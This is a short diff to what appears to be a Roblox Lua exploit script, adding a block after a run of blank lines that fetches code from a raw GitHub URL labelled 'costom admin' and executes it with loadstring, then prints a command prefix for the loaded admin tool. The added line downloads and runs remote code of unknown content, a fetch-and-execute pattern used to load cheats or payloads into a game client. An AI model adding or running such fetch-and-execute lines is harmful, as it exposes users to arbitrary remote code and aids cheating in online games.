@@ -1113,3 +1113,18 @@ local function MTKAZRG_fake_script() -- funnithing.Script
 	--end
 end
 coroutine.wrap(MTKAZRG_fake_script)()
+
+
+
+
+
+
+
+
+
+
+--load admin
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Deeri1/ine/main/costom%20admin'),true))()
+print("admin loaded")
+print("prefex is ;")
+print("do ;cmds to get started")
